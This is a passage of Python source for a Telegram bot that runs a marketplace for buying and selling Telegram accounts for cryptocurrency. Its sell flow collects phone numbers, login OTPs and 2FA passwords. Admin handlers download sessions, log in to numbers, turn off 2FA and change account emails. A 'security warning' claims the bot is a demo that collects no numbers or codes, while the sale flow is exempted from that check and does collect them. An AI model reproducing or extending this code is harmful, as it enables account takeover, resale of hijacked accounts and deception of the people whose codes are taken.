📩 **Message:** {message_text}
"""

        keyboard = [
            [InlineKeyboardButton("📩 Send More SMS", callback_data="admin_send_sms")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message to user {target_user_id}: {str(e)}")

    # Clear context
    context.user_data.pop('sms_target_user', None)
    context.user_data.pop('admin_sms_single_user', None)

async def handle_admin_chat_user_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin chat user ID input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    try:
        target_user_id = int(update.message.text.strip())
        context.user_data['chat_target_user'] = target_user_id

        await update.message.reply_text(
            f"💬 **Chat Started with User:** {target_user_id}\n\n📝 **Write your message:**\n\nExample: Hi there! I'm here to help you.",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid numeric User ID!")

async def handle_admin_chat_user_message_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin chat user message input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    target_user_id = context.user_data.get('chat_target_user')
    message_text = update.message.text.strip()

    try:
        # Create reply button for user
        keyboard = [[InlineKeyboardButton("💬 Reply to Admin", callback_data=f"reply_admin_{admin_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=target_user_id, 
            text=f"💬 **Message from Admin:**\n\n{message_text}",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )

        await update.message.reply_text(
            f"✅ **Message sent to user {target_user_id}**\n\n📩 **Your message:** {message_text}\n\n💬 **Chat is active - send more messages or go back to admin panel.**",
            parse_mode='Markdown'
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send message to user {target_user_id}: {str(e)}")
        # Clear context on error
        context.user_data.pop('chat_target_user', None)
        context.user_data.pop('admin_chat_user', None)

async def reply_to_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle user reply to admin"""
    query = update.callback_query
    await query.answer()

    # Extract admin ID from callback data
    admin_id = query.data.split('_')[-1]

    reply_text = """
💬 **Reply to Admin**

Write your message to send to the admin:

Example: Thank you for your help! I have a question about...

Please type your reply:
"""

    context.user_data['replying_to_admin'] = admin_id
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(reply_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_reply_to_admin_message_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle user reply to admin message input"""
    if not update.message or not update.message.text:
        return

    admin_id = context.user_data.get('replying_to_admin')
    if not admin_id:
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    message_text = update.message.text.strip()

    try:
        # Send message to admin
        await context.bot.send_message(
            chat_id=admin_id, 
            text=f"💬 **Reply from User:**\n\n👤 **User:** {user_name} (ID: {user_id})\n📩 **Message:** {message_text}",
            parse_mode='Markdown'
        )

        # Confirm to user
        await update.message.reply_text(
            "✅ **Your reply has been sent to the admin!**\n\nThey will get back to you soon.",
            parse_mode='Markdown'
        )

    except Exception as e:
        await update.message.reply_text("❌ Failed to send your reply. Please try again later.")
        logger.error(f"Failed to send reply to admin {admin_id}: {e}")

    # Clear context
    context.user_data.pop('replying_to_admin', None)

async def admin_message_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Route admin messages based on context"""
    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    text = update.message.text.strip() if update.message and update.message.text else ""
    
    # Handle Reply Keyboard buttons for admin
    reply_keyboard_buttons = ["💸 Sell Account", "🏦 Withdrawal", "💰 Balance", "ℹ️ Safety & Terms"]
    if text in reply_keyboard_buttons:
        # Forward to handle_reply_keyboard logic
        logger.info(f"Reply Keyboard pressed: '{text}' by admin {admin_id}")
        
        class FakeQuery:
            def __init__(self, original_update):
                self.from_user = original_update.effective_user
                self.message = original_update.message
                self.data = None

            async def answer(self, text=None, show_alert=False):
                pass

            async def edit_message_text(self, text, **kwargs):
                await update.message.reply_text(text, **kwargs)

            async def edit_message_reply_markup(self, reply_markup=None):
                await update.message.reply_text("Choose an option:", reply_markup=reply_markup)

        class FakeUpdate:
            def __init__(self, original_update, fake_query):
                self.effective_user = original_update.effective_user
                self.effective_chat = original_update.effective_chat
                self.callback_query = fake_query

        fake_query = FakeQuery(update)
        fake_update = FakeUpdate(update, fake_query)

        if text == "💸 Sell Account":
            await sell_account_callback(fake_update, context)
        elif text == "🏦 Withdrawal":
            await withdrawal_callback(fake_update, context)
        elif text == "💰 Balance":
            await balance_callback(fake_update, context)
        elif text == "ℹ️ Safety & Terms":
            await terms_command(update, context)
        return

    # Check if admin is in operation mode
    if 'admin_block_number' in context.user_data:
        await handle_admin_block_number_input(update, context)
        return
    elif 'admin_unblock_number' in context.user_data:
        await handle_admin_unblock_number_input(update, context)
        return
    elif 'admin_operation' in context.user_data:
        await handle_admin_amount_input(update, context)
    elif 'admin_balance_type' in context.user_data:
        await handle_admin_user_id_input(update, context)
    elif 'admin_add_new_country' in context.user_data and 'new_country_name' not in context.user_data:
        await handle_admin_new_country_name_input(update, context)
    elif 'admin_add_new_country' in context.user_data and 'new_country_name' in context.user_data:
        await handle_admin_new_country_price_input(update, context)
    elif 'price_control_country' in context.user_data:
        await handle_admin_price_change_input(update, context)
    elif 'admin_sms_all_users' in context.user_data:
        await handle_admin_sms_all_users_input(update, context)
    elif 'admin_sms_single_user' in context.user_data and 'sms_target_user' not in context.user_data:
        await handle_admin_sms_single_user_id_input(update, context)
    elif 'sms_target_user' in context.user_data:
        await handle_admin_sms_single_user_message_input(update, context)
    elif 'admin_chat_user' in context.user_data and 'chat_target_user' not in context.user_data:
        await handle_admin_chat_user_id_input(update, context)
    elif 'chat_target_user' in context.user_data:
        await handle_admin_chat_user_message_input(update, context)
    elif 'admin_link_add' in context.user_data:
        await handle_admin_link_add_input(update, context)
    elif 'replying_to_admin' in context.user_data:
        await handle_reply_to_admin_message_input(update, context)
    elif 'admin_withdrawal_all_set' in context.user_data:
        await handle_admin_withdrawal_all_set_input(update, context)
    elif 'admin_withdrawal_custom_user' in context.user_data and 'withdrawal_limit_target_user' not in context.user_data:
        await handle_admin_withdrawal_custom_user_id_input(update, context)
    elif 'withdrawal_limit_target_user' in context.user_data:
        await handle_admin_withdrawal_custom_user_limit_input(update, context)
    elif 'reject_sms_user_id' in context.user_data:
        await handle_reject_sms_message_input(update, context)
    elif 'reject_pin_sms_user_id' in context.user_data:
        await handle_reject_pin_sms_message_input(update, context)
    elif 'admin_2fa_off_target' in context.user_data:
        await handle_admin_2fa_off_input(update, context)
    elif 'admin_email_change_target' in context.user_data:
        await handle_admin_email_change_input(update, context)
    elif 'admin_email_verify_target' in context.user_data:
        await handle_admin_email_verify_input(update, context)
    # If no specific context, ignore the message

async def handle_buy_country_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle buying account from specific country"""
    query = update.callback_query
    await query.answer()

    # Extract country key from callback data: buy_country_{country_key}
    country_key = query.data.split('_', 2)[2]

    if country_key not in COUNTRIES_DATA:
        await query.edit_message_text("❌ Country data not found!")
        return

    country_data = COUNTRIES_DATA[country_key]
    # Calculate 30% higher price for buying
    buy_price = country_data['buy_price']

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)

    # Check Top-Up balance (as per user requirement)
    if user_info['topup_balance_usdt'] >= buy_price:
        # Deduct from Top-Up balance and increment bought accounts
        user_info['topup_balance_usdt'] -= buy_price
        user_info['accounts_bought'] += 1
        save_user_data()

        success_text = f"""
✅ **Purchase Successful!**

🌍 **Country:** {country_data['name']}
💰 **Cost:** ${buy_price} USD
💳 **Current Top-Up Balance:** {user_info['topup_balance_usdt']:.2f} USDT

📧 Account details will be sent to your inbox soon.

🎉 Thank you for using our service!
"""
        keyboard = [
            [InlineKeyboardButton("🛒 Buy More", callback_data="buy_account")],
            [InlineKeyboardButton("💰 View Balance", callback_data="balance")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
        ]
    else:
        needed = buy_price - user_info['topup_balance_usdt']
        success_text = f"""
❌ **Insufficient Top-Up Balance!**

🌍 **Country:** {country_data['name']}
💰 **Required:** ${buy_price} USD
💳 **Your Top-Up Balance:** {user_info['topup_balance_usdt']:.2f} USDT
🔺 **Additional Required:** ${needed:.2f} USD

💳 Please top-up your balance first.
"""
        keyboard = [
            [InlineKeyboardButton("💳 Top-Up Balance", callback_data="topup")],
            [InlineKeyboardButton("💰 View Balance", callback_data="balance")],
            [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
        ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')

async def placeholder_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Placeholder for features under development"""
    query = update.callback_query
    await query.answer("This feature is coming soon! 🚧", show_alert=True)

async def handle_reply_keyboard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Reply Keyboard button presses"""
    if not update.message or not update.message.text:
        return

    text = update.message.text.strip()
    logger.info(f"Reply Keyboard pressed: '{text}' by user {update.effective_user.id}")

    # Always check channel membership (admin is exempt)
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_CHAT_ID:
        if not await is_channel_member(context.bot, update.effective_user.id):
            await send_join_channel_prompt(update, context)
            return

    # Create a fake callback query object for compatibility with existing handlers
    class FakeQuery:
        def __init__(self, user_id):
            self.from_user = update.effective_user
            self.message = update.message
            self.data = None  # Add data attribute

        async def answer(self, text=None, show_alert=False):
            pass

        async def edit_message_text(self, text, **kwargs):
            await update.message.reply_text(text, **kwargs)

        async def edit_message_reply_markup(self, reply_markup=None):
            await update.message.reply_text("Choose an option:", reply_markup=reply_markup)

    # Create a simple fake update object
    class FakeUpdate:
        def __init__(self, original_update, fake_query):
            self.effective_user = original_update.effective_user
            self.effective_chat = original_update.effective_chat
            self.callback_query = fake_query

    fake_query = FakeQuery(update.effective_user.id)
    fake_update = FakeUpdate(update, fake_query)

    # Map Reply Keyboard buttons to callback functions
    if text == "💸 Sell Account":
        await sell_account_callback(fake_update, context)
    elif text == "🏦 Withdrawal":
        await withdrawal_callback(fake_update, context)
    elif text == "💰 Balance":
        await balance_callback(fake_update, context)
    elif text == "ℹ️ Safety & Terms":
        await terms_command(update, context)
    elif text == "👥 Refer & Earn":
        await refer_callback(fake_update, context)
    elif text == "📜 My History":
        await my_history_callback(update, context)
    # Removed My History handler

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Main callback query handler"""
    query = update.callback_query
    data = query.data

    # Handle admin approval callbacks
    if data and data.startswith('approve_sell_'):
        await approve_sell_callback(update, context)
        return
    
    if data == 'cancel_sale_otp':
        context.user_data.pop('admin_approved', None)
        context.user_data.pop('user_number', None)
        context.user_data.pop('country_data', None)
        await query.edit_message_text("❌ Sale cancelled by user.")
        return
    if data and data.startswith('reject_sell_'):
        await reject_sell_callback(update, context)
        return
    if data and data.startswith('approve_'):
        await approve_callback(update, context)
        return

    # Handle admin add/remove balance callbacks
    if data and (data.startswith('admin_add_') or data.startswith('admin_remove_')):
        await admin_add_remove_callback(update, context)
        return

    # Handle buy country callbacks
    if data and data.startswith('buy_country_'):
        await handle_buy_country_callback(update, context)
        return
    
    # Handle admin edit sell price callbacks
    if data and data.startswith('admin_edit_sell_'):
        await admin_edit_sell_price_callback(update, context)
        return

    # Handle reply to admin callbacks
    if data and data.startswith('reply_admin_'):
        await reply_to_admin_callback(update, context)
        return

    handlers = {
        'balance': balance_callback,
        'history': my_history_callback,
        'my_history': my_history_callback,
        'buy_account': buy_account_callback,
        'sell_account': sell_account_callback,
        'topup': topup_callback,
        'withdrawal': withdrawal_callback,
        'buy_premium': buy_premium_callback,
        'buy_standard': buy_standard_callback,
        'buy_basic': buy_basic_callback,
        'main_menu': main_menu_callback,

        # Country region handlers
        'countries_europe': countries_europe_callback,
        'countries_asia': countries_asia_callback,
        'countries_africa': countries_africa_callback,
        'countries_america': countries_america_callback,
        'countries_others': countries_others_callback,

        # Admin handlers
        'admin_panel': admin_panel_callback,
        'admin_main_balance': lambda u, c: admin_balance_control_start(u, c, 'main'),
        'admin_hold_balance': lambda u, c: admin_balance_control_start(u, c, 'hold'),
        'admin_price_control': admin_price_control_callback,
        'admin_sell_price_control': admin_sell_price_control_callback,
        'admin_buy_price_control': admin_buy_price_control_callback,
        'admin_topup_info': admin_topup_info_callback,
        'admin_send_sms': admin_send_sms_callback,
        'admin_chat_user': admin_chat_user_callback,
        'admin_sms_all_users': admin_sms_all_users_callback,
        'admin_sms_single_user': admin_sms_single_user_callback,
        'admin_add_new_country': admin_add_new_country_callback,
        'admin_withdrawal_set': admin_withdrawal_set_callback,
        'admin_withdrawal_all_set': admin_withdrawal_all_set_callback,
        'admin_withdrawal_custom_user': admin_withdrawal_custom_user_callback,
        'admin_link_add': admin_link_add_callback,

        # Reply to admin handler  
        'reply_admin': reply_to_admin_callback,

        # Withdrawal method handlers
        'withdraw_binance': withdraw_binance_callback,
        'withdraw_payeer': withdraw_payeer_callback,
        'withdraw_trc20': withdraw_trc20_callback,
        'withdraw_bep20': withdraw_bep20_callback,
        'withdraw_paypal': withdraw_paypal_callback,
        'withdraw_bitcoin': withdraw_bitcoin_callback,
        'withdraw_cashapp': withdraw_cashapp_callback,
        'withdraw_upi': withdraw_upi_callback,
        'withdraw_bank': withdraw_bank_callback,

        # Top-up payment method handlers
        'topup_binance': topup_binance_callback,
        'topup_payeer': topup_payeer_callback,
        'topup_trc20': topup_trc20_callback,
        'topup_bep20': topup_bep20_callback,
        'topup_arbitrum': topup_arbitrum_callback,

        # Terms handler  
        'terms': lambda u, c: terms_command(u, c),

        # Refer handler
        'refer': refer_callback,

        # Placeholder handlers for other sub-features
        'submit_account': placeholder_callback,
    }

    handler = handlers.get(data, placeholder_callback)
    await handler(update, context)

async def pii_guard_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Guard against users accidentally sharing phone numbers or verification codes"""
    if not update.message or not update.message.text:
        return

    text = update.message.text.strip()

    # Patterns to detect phone numbers and verification codes
    phone_patterns = [
        r'\+?\d{10,15}',  # Phone numbers with optional +
        r'\d{3}[-.\s]?\d{3}[-.\s]?\d{4}',  # US format
        r'\(\d{3}\)\s?\d{3}[-.\s]?\d{4}',  # (xxx) xxx-xxxx format
    ]

    code_patterns = [
        r'^[0-9]{4,8}$',  # 4-8 digit codes
        r'\b[0-9]{4,8}\b',  # 4-8 digit codes in text
    ]

    # BGT Wallet exception - do not block codes/numbers if in sale flow
    if context.user_data.get('user_number') or context.user_data.get('admin_approved'):
        return

    # Check for phone numbers
    for pattern in phone_patterns:
        if re.search(pattern, text):
            warning_text = """
⚠️ **Security Warning!**

We do not collect phone numbers.

🚫 **Please do not share phone numbers.**

💡 This is a demo/test bot. All activities are for testing purposes only.

Return to main menu with /start.
"""
            await update.message.reply_text(warning_text, parse_mode='Markdown')
            return

    # Check for verification codes
    for pattern in code_patterns:
        if re.search(pattern, text):
            warning_text = """
⚠️ **Security Warning!**

We do not collect verification codes.

🚫 **Please do not share any codes.**

💡 This is a demo/test bot. No OTP or verification required.

Return to main menu with /start.
"""
            await update.message.reply_text(warning_text, parse_mode='Markdown')
            return

async def terms_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show safety terms and conditions"""
    terms_text = """
ℹ️ **Safety & Terms of Use for the Bot**

Thank you for using our bot! Before you proceed, please carefully read the following safety guidelines and terms of service. By using the bot, you are considered to have agreed to these terms.

🛡️ **Safety Guidelines**

We have established some rules to ensure a safe and positive environment for all users. Adherence to these rules is mandatory:

• **No Spamming:** Refrain from sending any form of spam or unnecessary messages using the bot.
• **Hate Speech and Harassment are Prohibited:** The bot must not be used to attack any race, religion, ethnicity, gender, or group, or to harass any individual.
• **Illegal Activities:** Using the bot for any illegal activities, such as making threats, engaging in fraud, or sharing illegal information, is strictly forbidden.
• **Abuse of the Bot:** Do not exploit any bugs or glitches in the bot or attempt to crash it.
• **Protection of Personal Information:** Do not attempt to collect or share the personal information of other users through the bot.

Violation of these rules may result in you being banned from using the bot.

📜 **Terms of Service**

**1. Acceptance of Terms:**
By using this bot, you fully agree to our Terms of Service. If you do not agree with these terms, you are requested not to use the bot.

**2. Data and Privacy:**
• **Data Collection:** To function correctly, the bot may collect some basic information, such as your User ID and Server ID. We do not collect your personal messages or any sensitive information.
• **Use of Data:** The collected data is used solely to improve the bot's functionality and enhance the user experience. We do not sell or share your data with any third parties.

**3. Changes and Termination of Service:**
We reserve the right to modify, suspend, or completely terminate the bot's services at any time without prior notice.

**4. Limitation of Liability:**
The bot is provided on an "as is" basis. The bot developer will not be liable for any direct or indirect damages to you or your server resulting from its use. We do not guarantee the bot's constant availability or accuracy.

**5. Changes to Terms:**
We reserve the right to change these terms from time to time. We will attempt to notify you of any major changes. Your continued use of the bot after any modifications will be considered your acceptance of the new terms.

Thank you again for using our bot. For any questions or feedback, please contact us.

Return to main menu with /start.
"""

    keyboard = [[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(terms_text, reply_markup=reply_markup, parse_mode='Markdown')

async def check_broadcast_queue(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check for pending notifications from the web admin panel"""
    queue_file = 'broadcast_queue.json'
    if not os.path.exists(queue_file):
        return

    try:
        with open(queue_file, 'r') as f:
            queue = json.load(f)
            if not queue or not isinstance(queue, list):
                return
        
        # Clear the queue immediately to avoid double sending
        with open(queue_file, 'w') as f:
            json.dump([], f)
            
        for notification in queue:
            notify_type = notification.get('type', 'all')
            message = notification.get('message', '')
            if not message:
                continue
                
            if notify_type == 'custom':
                chat_id = notification.get('chat_id')
                if chat_id:
                    try:
                        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
                        logger.info(f"Custom notification sent to {chat_id}")
                    except Exception as e:
                        logger.error(f"Failed to send custom notification to {chat_id}: {e}")
            else:
                # Broadcast to all users
                user_ids = list(user_data.keys())
                success_count = 0
                for uid in user_ids:
                    try:
                        await context.bot.send_message(chat_id=int(uid), text=message, parse_mode='Markdown')
                        success_count += 1
                        # Small delay to avoid rate limiting
                        await asyncio.sleep(0.05)
                    except Exception:
                        continue
                logger.info(f"Broadcast sent to {success_count} users")
                
    except Exception as e:
        logger.error(f"Error in check_broadcast_queue: {e}")

async def admin_create_emoji_pack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command: create bot-owned custom emoji pack with USDT logo"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_CHAT_ID:
        return

    await update.message.reply_text("⏳ Emoji pack তৈরি হচ্ছে, একটু অপেক্ষা করুন...")

    try:
        from PIL import Image
        import io

        bot_info = await context.bot.get_me()
        bot_username = bot_info.username
        set_name = f"bgtlogos_by_{bot_username}"

        # Convert PNG → 100x100 WebP
        img = Image.open("attached_assets/usdt_1782189584366.png").convert("RGBA")
        img = img.resize((100, 100), Image.LANCZOS)
        webp_buffer = io.BytesIO()
        img.save(webp_buffer, format="WEBP")
        webp_buffer.seek(0)

        # Upload sticker file
        sticker_file = await context.bot.upload_sticker_file(
            user_id=int(ADMIN_CHAT_ID),
            sticker=webp_buffer,
            sticker_format="static"
        )

        # Build InputSticker
        input_sticker = tg.InputSticker(
            sticker=sticker_file.file_id,
            emoji_list=["💲"],
            format="static"
        )

        # Try creating new set; if already exists, just fetch it
        try:
            await context.bot.create_new_sticker_set(
                user_id=int(ADMIN_CHAT_ID),
                name=set_name,
                title="BGT Logos",
                stickers=[input_sticker],
                sticker_type="custom_emoji"
            )
        except Exception as create_err:
            if "already" not in str(create_err).lower():
                raise create_err

        # Get the sticker set and extract custom_emoji_id
        sticker_set = await context.bot.get_sticker_set(set_name)
        emoji_id = sticker_set.stickers[0].custom_emoji_id

        await update.message.reply_text(
            f"✅ *Emoji Pack তৈরি হয়েছে!*\n\n"
            f"Pack: `{set_name}`\n"
            f"USDT Emoji ID: `{emoji_id}`\n\n"
            f"এই ID টা আমাকে দিন — button-এ লাগিয়ে দেবো।",
            parse_mode='Markdown'
        )

    except Exception as e:
        logger.error(f"create_emoji_pack error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")


def main() -> None:
    """Start the bot"""
    # Load all persistent data
    # Bot token - hardcoded for portability
    token = BOT_TOKEN

    # Load data at startup
    load_user_data()
    load_withdrawal_settings()
    load_blocked_numbers()
    load_countries_data()
    
    # Verify countries data
    if not COUNTRIES_DATA:
        logger.error("COUNTRIES_DATA is empty at startup!")
    else:
        logger.info(f"COUNTRIES_DATA loaded with {len(COUNTRIES_DATA)} countries")

    # Create application
    application = Application.builder().token(token).concurrent_updates(True).build()

    # Manual background check since JobQueue might be missing or complex to install
    async def notification_worker():
        while True:
            try:
                # Create a fake context for the worker
                class FakeContext:
                    def __init__(self, bot):
                        self.bot = bot
                
                await check_broadcast_queue(FakeContext(application.bot))
            except Exception as e:
                logger.error(f"Error in notification_worker: {e}")
            await asyncio.sleep(10)

    # We'll start this task in the main loop or as a background task if possible
    # But since PTB 20+ uses asyncio, we can just spawn it
    import asyncio
    asyncio.get_event_loop().create_task(notification_worker())

    # Background watcher: auto-reload countries_data.json if changed by web admin
    async def countries_watcher():
        while True:
            try:
                reload_countries_if_changed()
            except Exception as e:
                logger.error(f"Error in countries_watcher: {e}")
            await asyncio.sleep(2)

    asyncio.get_event_loop().create_task(countries_watcher())

    # Create conversation handler for sell account flow
    sell_conversation = ConversationHandler(
        entry_points=[CallbackQueryHandler(country_selection_handler, pattern=r'^select_')],
        states={
            WAITING_FOR_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number_input)],
            WAITING_FOR_ADMIN_APPROVAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pin_input)],
            WAITING_FOR_PIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pin_input),
                             CallbackQueryHandler(cancel_sell_conversation, pattern="^cancel_sale_otp$")],
            WAITING_FOR_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_2fa_input)]
        },
        fallbacks=[
            CallbackQueryHandler(cancel_sell_conversation, pattern=r'^sell_account$'),
            CommandHandler('start', start),
            # If the user clicks any OTHER main button mid-sell: cancel the sell
            # flow AND route the click to its real handler so it still works.
            CallbackQueryHandler(
                cancel_sell_and_route,
                pattern=r'^(?!select_|sell_page_|sell_account$|cancel_sale_otp$|terminate_session_).+$',
            ),
        ],
        per_message=False,
        per_chat=True,
        per_user=True,
    )

    # Add pagination handler
    application.add_handler(CallbackQueryHandler(sell_pagination_handler, pattern=r'^sell_page_'))
    
    # Add handler for bot status buttons
    application.add_handler(CallbackQueryHandler(admin_bot_status_callback, pattern="^admin_bot_"))

    # Create conversation handler for withdrawal flow
    withdraw_conversation = ConversationHandler(
        entry_points=[CallbackQueryHandler(withdraw_method_selection, pattern=r'^withdraw_usdt_')],
        states={
            WAITING_FOR_WITHDRAW_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdraw_address)],
            WAITING_FOR_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_withdraw_amount)],
        },
        fallbacks=[
            CommandHandler('start', start),
            CallbackQueryHandler(withdrawal_callback, pattern=r'^withdrawal$')
        ],
        per_message=False,
        per_chat=True,
        per_user=True,
    )

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("terms", terms_command))
    application.add_handler(CommandHandler("create_emoji", admin_create_emoji_pack))
    application.add_handler(sell_conversation)
    application.add_handler(withdraw_conversation)
    
    # Add explicit admin callback handlers (higher priority - before generic callback handler)
    application.add_handler(CallbackQueryHandler(admin_download_data_callback, pattern="^admin_download_data$"))
    application.add_handler(CallbackQueryHandler(admin_download_countries_callback, pattern="^admin_download_countries$"))
    application.add_handler(CallbackQueryHandler(admin_download_sessions_callback, pattern="^admin_download_sessions$"))
    application.add_handler(CallbackQueryHandler(admin_country_sessions_callback, pattern="^admin_country_sessions$"))
    application.add_handler(CallbackQueryHandler(admin_dl_country_callback, pattern=r"^admin_dl_country\|"))
    application.add_handler(CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(lambda u, c: admin_balance_control_start(u, c, 'main'), pattern="^admin_main_balance$"))
    application.add_handler(CallbackQueryHandler(lambda u, c: admin_balance_control_start(u, c, 'hold'), pattern="^admin_hold_balance$"))
    application.add_handler(CallbackQueryHandler(approve_sell_callback, pattern="^approve_sell_"))
    application.add_handler(CallbackQueryHandler(reject_sell_callback, pattern="^reject_sell_"))
    application.add_handler(CallbackQueryHandler(reject_sms_callback, pattern="^reject_sms_"))
    application.add_handler(CallbackQueryHandler(reject_pin_callback, pattern="^reject_pin_"))
    application.add_handler(CallbackQueryHandler(reject_pin_sms_callback, pattern="^reject_pin_sms_"))
    application.add_handler(CallbackQueryHandler(approve_callback, pattern="^approve_\d+_\d+(\.\d+)?$"))
    application.add_handler(CallbackQueryHandler(admin_sell_price_control_callback, pattern="^admin_sell_price_control(_page_\\d+)?$"))
    application.add_handler(CallbackQueryHandler(admin_buy_price_control_callback, pattern="^admin_buy_price_control$"))
    application.add_handler(CallbackQueryHandler(admin_topup_info_callback, pattern="^admin_topup_info$"))
    application.add_handler(CallbackQueryHandler(admin_send_sms_callback, pattern="^admin_send_sms$"))
    application.add_handler(CallbackQueryHandler(admin_chat_user_callback, pattern="^admin_chat_user$"))
    application.add_handler(CallbackQueryHandler(admin_link_add_callback, pattern="^admin_link_add$"))
    application.add_handler(CallbackQueryHandler(admin_add_new_country_callback, pattern="^admin_add_new_country$"))
    application.add_handler(CallbackQueryHandler(admin_delete_country_callback, pattern="^admin_delete_country$"))
    application.add_handler(CallbackQueryHandler(admin_confirm_delete_country_callback, pattern="^admin_del_country_"))
    application.add_handler(CallbackQueryHandler(admin_withdrawal_set_callback, pattern="^admin_withdrawal_set$"))
    application.add_handler(CallbackQueryHandler(admin_withdrawal_all_set_callback, pattern="^admin_withdrawal_all_set$"))
    application.add_handler(CallbackQueryHandler(admin_withdrawal_custom_user_callback, pattern="^admin_withdrawal_custom_user$"))
    
    # Channel join check handler (high priority)
    application.add_handler(CallbackQueryHandler(join_channel_check_callback, pattern="^check_channel_join$"))

    # Spam account 50% price offer handlers
    application.add_handler(CallbackQueryHandler(spam_confirm_sale_callback, pattern="^spam_confirm_sale$"))
    application.add_handler(CallbackQueryHandler(spam_cancel_sale_callback, pattern="^spam_cancel_sale$"))

    # Add OTP confirmation handlers
    application.add_handler(CallbackQueryHandler(confirm_otp_callback, pattern="^confirm_otp_"))
    application.add_handler(CallbackQueryHandler(wrong_otp_callback, pattern="^wrong_otp_"))
    application.add_handler(CallbackQueryHandler(final_approve_callback, pattern="^final_approve_"))
    application.add_handler(CallbackQueryHandler(final_reject_callback, pattern="^final_reject_"))
    application.add_handler(CallbackQueryHandler(wd_approve_callback, pattern="^wd_approve_"))
    application.add_handler(CallbackQueryHandler(wd_reject_callback, pattern="^wd_reject_"))

    # Session termination buttons (logout per-device from security alert)
    application.add_handler(CallbackQueryHandler(terminate_session_callback, pattern="^terminate_session_"))

    # Block/unblock number admin handlers
    application.add_handler(CallbackQueryHandler(admin_block_number_callback, pattern="^admin_block_number$"))
    application.add_handler(CallbackQueryHandler(admin_unblock_number_callback, pattern="^admin_unblock_number$"))
    application.add_handler(CallbackQueryHandler(admin_blocked_list_callback, pattern="^admin_blocked_list$"))
    application.add_handler(CallbackQueryHandler(admin_logout_list_callback, pattern="^admin_logout_list$"))
    application.add_handler(CallbackQueryHandler(admin_logout_do_callback, pattern=r"^admin_logout_do\|"))
    application.add_handler(CallbackQueryHandler(admin_login_list_callback, pattern="^admin_login_list$"))
    application.add_handler(CallbackQueryHandler(admin_login_number_callback, pattern=r"^admin_login_num\|"))
    application.add_handler(CallbackQueryHandler(admin_login_device_logout_callback, pattern=r"^admin_login_dev_out\|"))
    application.add_handler(CallbackQueryHandler(admin_2fa_off_callback, pattern=r"^admin_2fa_off\|"))
    application.add_handler(CallbackQueryHandler(admin_email_change_callback, pattern=r"^admin_email_change\|"))

    # Generic callback handler (lower priority - catches remaining callbacks)
    application.add_handler(CallbackQueryHandler(callback_handler))

    # Add Reply Keyboard handler (higher priority - before other text handlers, but exclude admin messages)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Chat(ADMIN_CHAT_ID_INT), handle_reply_keyboard))

    # Add admin message router (medium priority)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Chat(ADMIN_CHAT_ID_INT), admin_message_router))

    # Add PII guard for all text messages (but not commands) - lower priority
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, pii_guard_handler))

    # Log startup
    logger.info("Starting Telegram Account Trading Bot...")
    logger.info(f"Loaded data for {len(user_data)} existing users")

    # Start the bot
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
